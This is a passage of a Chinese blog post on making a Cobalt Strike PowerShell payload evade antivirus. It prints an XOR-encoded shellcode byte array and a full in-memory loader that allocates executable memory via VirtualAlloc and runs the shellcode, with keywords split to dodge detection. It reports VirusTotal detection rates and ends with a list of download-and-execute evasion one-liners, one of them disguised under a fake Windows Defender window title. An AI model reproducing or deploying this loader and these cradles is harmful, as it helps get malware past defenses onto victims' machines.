<p>与之前的一样，我们需要添加混淆的还是<code>$var_code</code><br>思路是将base64编码换掉，因为base64编码会被杀掉，改成byte数组<br><img src="https://s2.loli.net/2022/08/16/uT4nE71YSL5rpxf.png" srcset="/img/loading.gif" lazyload></p>
<p>这可能就是传说中的FromBase65String？<br>将<code>$var_code</code>改掉</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">[Byte[]]$var_code = [Byte[]](<span class="hljs-number">223,203,170,35</span>,<span class="hljs-number">35,35,67,170</span>,<span class="hljs-number">198,18,241,71</span>,<span class="hljs-number">168,113,19,168</span>,<span class="hljs-number">113,47,168,113</span>,<span class="hljs-number">55,168,81,11</span>,<span class="hljs-number">44,148,105,5</span>,<span class="hljs-number">18,220,18,227</span>,<span class="hljs-number">143,31,66,95</span>,<span class="hljs-number">33,15,3,226</span>,<span class="hljs-number">236,46,34,228</span>,<span class="hljs-number">193,211,113,116</span>,<span class="hljs-number">168,113,51,168</span>,<span class="hljs-number">97,31,34,243</span>,<span class="hljs-number">168,99,91,166</span>,<span class="hljs-number">227,87,105,34</span>,<span class="hljs-number">243,115,168,107</span>,<span class="hljs-number">59,168,123,3</span>,<span class="hljs-number">34,240,192,31</span>,<span class="hljs-number">106,168,23,168</span>,<span class="hljs-number">34,245,18,220</span>,<span class="hljs-number">18,227,143,226</span>,<span class="hljs-number">236,46,34,228</span>,<span class="hljs-number">27,195,86,215</span>,<span class="hljs-number">32,94,219,24</span>,<span class="hljs-number">94,7,86,193</span>,<span class="hljs-number">123,168,123,7</span>,<span class="hljs-number">34,240,69,168</span>,<span class="hljs-number">47,104,168,123</span>,<span class="hljs-number">63,34,240,168</span>,<span class="hljs-number">39,168,34,243</span>,<span class="hljs-number">170,103,7,7</span>,<span class="hljs-number">120,120,66,122</span>,<span class="hljs-number">121,114,220,195</span>,<span class="hljs-number">123,124,121,168</span>,<span class="hljs-number">49,200,165,126</span>,<span class="hljs-number">75,77,70,87</span>,<span class="hljs-number">35,75,84,74</span>,<span class="hljs-number">77,74,119,75</span>,<span class="hljs-number">111,84,5,36</span>,<span class="hljs-number">220,246,18,220</span>,<span class="hljs-number">116,116,116,116</span>,<span class="hljs-number">116,75,25,117</span>,<span class="hljs-number">90,132,220,246</span>,<span class="hljs-number">202,167,35,35</span>,<span class="hljs-number">35,120,18,234</span>,<span class="hljs-number">114,114,73,32</span>,<span class="hljs-number">114,114,75,83</span>,<span class="hljs-number">142,35,35,112</span>,<span class="hljs-number">115,75,116,170</span>,<span class="hljs-number">188,229,220,246</span>,<span class="hljs-number">200,83,120,18</span>,<span class="hljs-number">241,113,75,35</span>,<span class="hljs-number">33,99,167,113</span>,<span class="hljs-number">113,113,112,113</span>,<span class="hljs-number">115,75,200,118</span>,<span class="hljs-number">13,24,220,246</span>,<span class="hljs-number">170,229,160,224</span>,<span class="hljs-number">115,18,220,116</span>,<span class="hljs-number">116,73,220,112</span>,<span class="hljs-number">117,75,14,37</span>,<span class="hljs-number">59,88,220,246</span>,<span class="hljs-number">166,227,44,167</span>,<span class="hljs-number">224,34,35,35</span>,<span class="hljs-number">18,220,166,213</span>,<span class="hljs-number">87,39,170,218</span>,<span class="hljs-number">200,42,75,137</span>,<span class="hljs-number">230,193,126,220</span>,<span class="hljs-number">246,170,226,75</span>,<span class="hljs-number">102,2,125,18</span>,<span class="hljs-number">220,246,18,220</span>,<span class="hljs-number">116,73,36,114</span>,<span class="hljs-number">117,115,75,148</span>,<span class="hljs-number">116,195,40,220</span>,<span class="hljs-number">246,156,35,12</span>,<span class="hljs-number">35,35,26,228</span>,<span class="hljs-number">87,148,18,220</span>,<span class="hljs-number">202,178,34,35</span>,<span class="hljs-number">35,202,234,34</span>,<span class="hljs-number">35,35,203,168</span>,<span class="hljs-number">220,220,220,12</span>,<span class="hljs-number">87,75,26,100</span>,<span class="hljs-number">35,22,108,2</span>,<span class="hljs-number">115,6,99,98</span>,<span class="hljs-number">115,120,23,127</span>,<span class="hljs-number">115,121,123,22</span>,<span class="hljs-number">23,11,115,125</span>,<span class="hljs-number">10,20,96,96</span>,<span class="hljs-number">10,20,94,7</span>,<span class="hljs-number">102,106,96,98</span>,<span class="hljs-number">113,14,112,119</span>,<span class="hljs-number">98,109,103,98</span>,<span class="hljs-number">113,103,14,98</span>,<span class="hljs-number">109,119,106,117</span>,<span class="hljs-number">106,113,118,112</span>,<span class="hljs-number">14,119,102,112</span>,<span class="hljs-number">119,14,101,106</span>,<span class="hljs-number">111,102,2,7</span>,<span class="hljs-number">107,8,107,9</span>,<span class="hljs-number">35,22,108,2</span>,<span class="hljs-number">115,6,35,118</span>,<span class="hljs-number">80,70,81,14</span>,<span class="hljs-number">98,68,70,77</span>,<span class="hljs-number">87,25,3,110</span>,<span class="hljs-number">76,89,74,79</span>,<span class="hljs-number">79,66,12,22</span>,<span class="hljs-number">13,19,3,11</span>,<span class="hljs-number">64,76,78,83</span>,<span class="hljs-number">66,87,74,65</span>,<span class="hljs-number">79,70,24,3</span>,<span class="hljs-number">110,112,106,102</span>,<span class="hljs-number">3,26,13,19</span>,<span class="hljs-number">24,3,116,74</span>,<span class="hljs-number">77,71,76,84</span>,<span class="hljs-number">80,3,109,119</span>,<span class="hljs-number">3,21,13,18</span>,<span class="hljs-number">24,3,116,108</span>,<span class="hljs-number">116,21,23,24</span>,<span class="hljs-number">3,119,81,74</span>,<span class="hljs-number">71,70,77,87</span>,<span class="hljs-number">12,22,13,19</span>,<span class="hljs-number">24,3,110,98</span>,<span class="hljs-number">112,97,10,46</span>,<span class="hljs-number">41,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,35,75</span>,<span class="hljs-number">211,150,129,117</span>,<span class="hljs-number">220,246,73,99</span>,<span class="hljs-number">75,35,51,35</span>,<span class="hljs-number">35,75,35,35</span>,<span class="hljs-number">99,35,116,75</span>,<span class="hljs-number">123,135,112,198</span>,<span class="hljs-number">220,246,176,154</span>,<span class="hljs-number">35,35,35,35</span>,<span class="hljs-number">34,250,114,112</span>,<span class="hljs-number">170,196,116,75</span>,<span class="hljs-number">35,3,35,35</span>,<span class="hljs-number">112,117,75,49</span>,<span class="hljs-number">181,170,193,220</span>,<span class="hljs-number">246,166,227,87</span>,<span class="hljs-number">229,168,36,34</span>,<span class="hljs-number">224,166,227,86</span>,<span class="hljs-number">198,123,224,203</span>,<span class="hljs-number">138,222,220,220</span>,<span class="hljs-number">18,19,18,13</span>,<span class="hljs-number">18,16,17,13</span>,<span class="hljs-number">17,17,20,13</span>,<span class="hljs-number">17,17,20,35</span>,<span class="hljs-number">35,35,35,35</span>)<br></code></pre></td></tr></table></figure>
<p>现在再拿到virustotal上面去看看<br><img src="https://s2.loli.net/2022/08/16/WdOi26SaTtkljQG.png" srcset="/img/loading.gif" lazyload></p>
<p>离大谱，32/59不得不说，安全厂商估计也是天天在网上学习新的免杀方式</p>
<p>这里参考了Y4er师傅的处理方法，主要部分就是更改了关键字，</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs dns">Set-StrictMode -Version <span class="hljs-number">2</span><br><br>$DoIt = @&#x27;<br>function func_b &#123;<br>	Param ($amodule, $aprocedure)		<br>	$aunsafe_native_methods = ([AppDomain]<span class="hljs-number">::</span>CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-<span class="hljs-number">1</span>].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.Uns&#x27;+&#x27;afeN&#x27;+&#x27;ativeMethods&#x27;)<br>	$agpa = $aunsafe_native_methods.GetMethod(&#x27;GetP&#x27;+&#x27;rocAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))<br>	return $agpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($aunsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($amodule)))), $aprocedure))<br>&#125;<br><br>function func_a &#123;<br>	Param (<br>		[Parameter(Position = <span class="hljs-number">0</span>, Mandatory = $True)] [Type[]] $aparameters,<br>		[Parameter(Position = <span class="hljs-number">1</span>)] [Type] $areturn_type = [Void]<br>	)<br><br>	$atype_b = [AppDomain]<span class="hljs-number">::</span>CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;Reflect&#x27;+&#x27;edDel&#x27;+&#x27;egate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]<span class="hljs-number">::</span>Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDeleg&#x27;+&#x27;ateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])<br>	$atype_b.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]<span class="hljs-number">::</span>Standard, $aparameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)<br>	$atype_b.DefineMethod(&#x27;Inv&#x27;+&#x27;oke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $areturn_type, $aparameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)<br><br>	return $atype_b.CreateType()<br>&#125;<br><br>[Byte[]]$var_code = [Byte[]](<span class="hljs-number">223,203,170,35</span>,<span class="hljs-number">35,35,67,170</span>,<span class="hljs-number">198,18,241,71</span>,<span class="hljs-number">168,113,19,168</span>,<span class="hljs-number">113,47,168,113</span>,<span class="hljs-number">55,168,81,11</span>,<span class="hljs-number">44,148,105,5</span>,<span class="hljs-number">18,220,18,227</span>,<span class="hljs-number">143,31,66,95</span>,<span class="hljs-number">33,15,3,226</span>,<span class="hljs-number">236,46,34,228</span>,<span class="hljs-number">193,211,113,116</span>,<span class="hljs-number">168,113,51,168</span>,<span class="hljs-number">97,31,34,243</span>,<span class="hljs-number">168,99,91,166</span>,<span class="hljs-number">227,87,105,34</span>,<span class="hljs-number">243,115,168,107</span>,<span class="hljs-number">59,168,123,3</span>,<span class="hljs-number">34,240,192,31</span>,<span class="hljs-number">106,168,23,168</span>,<span class="hljs-number">34,245,18,220</span>,<span class="hljs-number">18,227,143,226</span>,<span class="hljs-number">236,46,34,228</span>,<span class="hljs-number">27,195,86,215</span>,<span class="hljs-number">32,94,219,24</span>,<span class="hljs-number">94,7,86,193</span>,<span class="hljs-number">123,168,123,7</span>,<span class="hljs-number">34,240,69,168</span>,<span class="hljs-number">47,104,168,123</span>,<span class="hljs-number">63,34,240,168</span>,<span class="hljs-number">39,168,34,243</span>,<span class="hljs-number">170,103,7,7</span>,<span class="hljs-number">120,120,66,122</span>,<span class="hljs-number">121,114,220,195</span>,<span class="hljs-number">123,124,121,168</span>,<span class="hljs-number">49,200,165,126</span>,<span class="hljs-number">75,77,70,87</span>,<span class="hljs-number">35,75,84,74</span>,<span class="hljs-number">77,74,119,75</span>,<span class="hljs-number">111,84,5,36</span>,<span class="hljs-number">220,246,18,220</span>,<span class="hljs-number">116,116,116,116</span>,<span class="hljs-number">116,75,25,117</span>,<span class="hljs-number">90,132,220,246</span>,<span class="hljs-number">202,167,35,35</span>,<span class="hljs-number">35,120,18,234</span>,<span class="hljs-number">114,114,73,32</span>,<span class="hljs-number">114,114,75,83</span>,<span class="hljs-number">142,35,35,112</span>,<span class="hljs-number">115,75,116,170</span>,<span class="hljs-number">188,229,220,246</span>,<span class="hljs-number">200,83,120,18</span>,<span class="hljs-number">241,113,75,35</span>,<span class="hljs-number">33,99,167,113</span>,<span class="hljs-number">113,113,112,113</span>,<span class="hljs-number">115,75,200,118</span>,<span class="hljs-number">13,24,220,246</span>,<span class="hljs-number">170,229,160,224</span>,<span class="hljs-number">115,18,220,116</span>,<span class="hljs-number">116,73,220,112</span>,<span class="hljs-number">117,75,14,37</span>,<span class="hljs-number">59,88,220,246</span>,<span class="hljs-number">166,227,44,167</span>,<span class="hljs-number">224,34,35,35</span>,<span class="hljs-number">18,220,166,213</span>,<span class="hljs-number">87,39,170,218</span>,<span class="hljs-number">200,42,75,137</span>,<span class="hljs-number">230,193,126,220</span>,<span class="hljs-number">246,170,226,75</span>,<span class="hljs-number">102,2,125,18</span>,<span class="hljs-number">220,246,18,220</span>,<span class="hljs-number">116,73,36,114</span>,<span class="hljs-number">117,115,75,148</span>,<span class="hljs-number">116,195,40,220</span>,<span class="hljs-number">246,156,35,12</span>,<span class="hljs-number">35,35,26,228</span>,<span class="hljs-number">87,148,18,220</span>,<span class="hljs-number">202,178,34,35</span>,<span class="hljs-number">35,202,234,34</span>,<span class="hljs-number">35,35,203,168</span>,<span class="hljs-number">220,220,220,12</span>,<span class="hljs-number">87,75,26,100</span>,<span class="hljs-number">35,22,108,2</span>,<span class="hljs-number">115,6,99,98</span>,<span class="hljs-number">115,120,23,127</span>,<span class="hljs-number">115,121,123,22</span>,<span class="hljs-number">23,11,115,125</span>,<span class="hljs-number">10,20,96,96</span>,<span class="hljs-number">10,20,94,7</span>,<span class="hljs-number">102,106,96,98</span>,<span class="hljs-number">113,14,112,119</span>,<span class="hljs-number">98,109,103,98</span>,<span class="hljs-number">113,103,14,98</span>,<span class="hljs-number">109,119,106,117</span>,<span class="hljs-number">106,113,118,112</span>,<span class="hljs-number">14,119,102,112</span>,<span class="hljs-number">119,14,101,106</span>,<span class="hljs-number">111,102,2,7</span>,<span class="hljs-number">107,8,107,9</span>,<span class="hljs-number">35,22,108,2</span>,<span class="hljs-number">115,6,35,118</span>,<span class="hljs-number">80,70,81,14</span>,<span class="hljs-number">98,68,70,77</span>,<span class="hljs-number">87,25,3,110</span>,<span class="hljs-number">76,89,74,79</span>,<span class="hljs-number">79,66,12,22</span>,<span class="hljs-number">13,19,3,11</span>,<span class="hljs-number">64,76,78,83</span>,<span class="hljs-number">66,87,74,65</span>,<span class="hljs-number">79,70,24,3</span>,<span class="hljs-number">110,112,106,102</span>,<span class="hljs-number">3,26,13,19</span>,<span class="hljs-number">24,3,116,74</span>,<span class="hljs-number">77,71,76,84</span>,<span class="hljs-number">80,3,109,119</span>,<span class="hljs-number">3,21,13,18</span>,<span class="hljs-number">24,3,116,108</span>,<span class="hljs-number">116,21,23,24</span>,<span class="hljs-number">3,119,81,74</span>,<span class="hljs-number">71,70,77,87</span>,<span class="hljs-number">12,22,13,19</span>,<span class="hljs-number">24,3,110,98</span>,<span class="hljs-number">112,97,10,46</span>,<span class="hljs-number">41,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,35,75</span>,<span class="hljs-number">211,150,129,117</span>,<span class="hljs-number">220,246,73,99</span>,<span class="hljs-number">75,35,51,35</span>,<span class="hljs-number">35,75,35,35</span>,<span class="hljs-number">99,35,116,75</span>,<span class="hljs-number">123,135,112,198</span>,<span class="hljs-number">220,246,176,154</span>,<span class="hljs-number">35,35,35,35</span>,<span class="hljs-number">34,250,114,112</span>,<span class="hljs-number">170,196,116,75</span>,<span class="hljs-number">35,3,35,35</span>,<span class="hljs-number">112,117,75,49</span>,<span class="hljs-number">181,170,193,220</span>,<span class="hljs-number">246,166,227,87</span>,<span class="hljs-number">229,168,36,34</span>,<span class="hljs-number">224,166,227,86</span>,<span class="hljs-number">198,123,224,203</span>,<span class="hljs-number">138,222,220,220</span>,<span class="hljs-number">18,19,18,13</span>,<span class="hljs-number">18,16,17,13</span>,<span class="hljs-number">17,17,20,13</span>,<span class="hljs-number">17,17,20,35</span>,<span class="hljs-number">35,35,35,35</span>)<br><br>for ($x = <span class="hljs-number">0</span><span class="hljs-comment">; $x -lt $acode.Count; $x++) &#123;</span><br>	$acode[$x] = $acode[$x] -bxor <span class="hljs-number">35</span><br>&#125;<br><br>$ava = [System.Runtime.InteropServices.Marshal]<span class="hljs-number">::</span>GetDelegateForFunctionPointer((func_b kernel32.dll VirtualAlloc), (func_a @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))<br>$abuffer = $ava.Invoke([IntPtr]<span class="hljs-number">::</span>Zero, $acode.Length, <span class="hljs-number">0</span>x3000, <span class="hljs-number">0</span>x40)<br>[System.Runtime.InteropServices.Marshal]<span class="hljs-number">::</span>Copy($acode, <span class="hljs-number">0</span>, $abuffer, $acode.length)<br><br>$arunme = [System.Runtime.InteropServices.Marshal]<span class="hljs-number">::</span>GetDelegateForFunctionPointer($abuffer, (func_a @([IntPtr]) ([Void])))<br>$arunme.Invoke([IntPtr]<span class="hljs-number">::</span>Zero)<br>&#x27;@<br><br>If ([IntPtr]<span class="hljs-number">::</span>size -eq <span class="hljs-number">8</span>) &#123;<br>	start-job &#123; param($a) ie`x $a &#125; -RunAs32 -Argument $DoIt | wait-job | Receive-Job<br>&#125;<br>else &#123;<br>	i`ex $DoIt<br>&#125;<br></code></pre></td></tr></table></figure>

<p>我们再放到virustotal上面试试<br><img src="https://s2.loli.net/2022/08/16/Eqp7YMwD8feWuVl.png" srcset="/img/loading.gif" lazyload><br>28/60，也就多绕过了4个防火墙<br>还是太菜了，手动的话，大概就这样了，下面贴一下在执行远程执行脚本时代码混淆，直接执行cs生成的语句杀软拦截的混淆操作</p>
<ol>
<li><p>使用Replace替换关键字部分字母，加上通过拆分后重新组合<br><code>powershell.exe -nop -w hidden -c &quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://0.0.0.0:4545/text.txt&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot;</code></p>
</li>
<li><p>使用powershell语言的特性来混淆代码</p>
</li>
</ol>
<p><code>cmd.exe /c &quot;powershell -c Write-Host SUCCESS -Fore Green&quot;</code></p>
<p><code>cmd.exe /c &quot;echo Write-Host SUCCESS -Fore Green | powershell -&quot;</code></p>
<p><code>cmd /c &quot;set p1=power&amp;&amp; set p2=shell&amp;&amp; cmd /c echo Write-Host SUCCESS -Fore Green ^|%p1%%p2% -&quot;</code></p>
<p>管道输入流：</p>
<p><code>cmd.exe /c &quot;echo Write-Host SUCCESS -Fore Green | powershell IEX $input&quot;</code></p>
<p>利用环境变量：</p>
<p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX $env:cmd&quot;</code></p>
<p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;cmd /c echo %cmd%|powershell -</code></p>
<p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ([Environment]::GetEnvironmentVariable(&#39;cmd&#39;, &#39;Process&#39;))</code></p>
<p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ((Get-ChildItem/ChildItem/GCI/DIR/LS env:cmd).Value)</code></p>
<p>从其他进程获取参数：</p>
<p><code>cmd /c &quot;title WINDOWS_DEFENDER_UPDATE&amp;&amp;echo IEX (IWR https://7ell.me/power)&amp;&amp; FOR /L %i IN (1,1,1000) DO echo&quot;</code></p>
<hr>
<p>参考文章：<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/TtKEnmUbtVMSqBCgrSj2Qw">https://mp.weixin.qq.com/s/TtKEnmUbtVMSqBCgrSj2Qw</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%85%8D%E6%9D%80/" class="category-chain-item">免杀</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%85%8D%E6%9D%80/">#免杀</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CS生成hta分析与powershell免杀</div>
      <div>https://glacierrrr.online/2022/08/16/CS生成hta分析与powershell免杀/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Glacier</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年8月16日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/08/18/dll%E5%8A%AB%E6%8C%81_%E7%99%BD%E5%8A%A0%E9%BB%91/" title="dll劫持_白加黑">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">dll劫持_白加黑</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/07/06/%E8%AE%B0%E4%B8%80%E6%AC%A1csdn%E7%9A%84xss%E6%BC%8F%E6%B4%9E/" title="记一次csdn的xss漏洞">
                        <span class="hidden-mobile">记一次csdn的xss漏洞</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
